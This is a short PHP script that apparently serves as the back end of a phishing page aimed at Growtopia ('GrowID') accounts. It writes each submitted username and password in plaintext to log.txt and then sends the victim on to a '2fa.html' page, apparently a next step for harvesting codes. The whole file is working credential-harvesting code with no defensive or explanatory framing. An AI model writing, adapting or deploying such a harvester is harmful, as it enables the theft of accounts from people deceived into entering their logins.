
<?php
if(isset($_POST['username']) && isset($_POST['password'])) {
    $file = fopen("log.txt", "a");
    fwrite($file, "GrowID: " . $_POST['username'] . " | Password: " . $_POST['password'] . "\n");
    fclose($file);
    header('Location: 2fa.html');
    exit();
} else {
    echo "Invalid input.";
}
?>
